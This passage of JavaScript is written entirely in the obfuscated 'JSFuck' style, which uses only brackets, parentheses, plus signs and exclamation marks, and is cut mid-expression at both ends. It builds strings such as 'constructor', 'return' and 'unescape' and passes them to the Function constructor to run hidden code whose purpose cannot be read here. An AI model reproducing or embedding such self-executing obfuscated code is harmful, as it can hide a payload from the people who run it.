(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+(!+[]+!+[]+!+[]+!+[]+!+[]+[+[]])+[])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[!+[]+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[+!+[]]])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]])()())[!+[]+!+[]+!+[]+[+[]]]+(+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+!+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]]+(![]+[])[+!+[]]+[!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+[!+[]+!+[]]+[+!+[]]+(![]+[])[+[]]+(![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[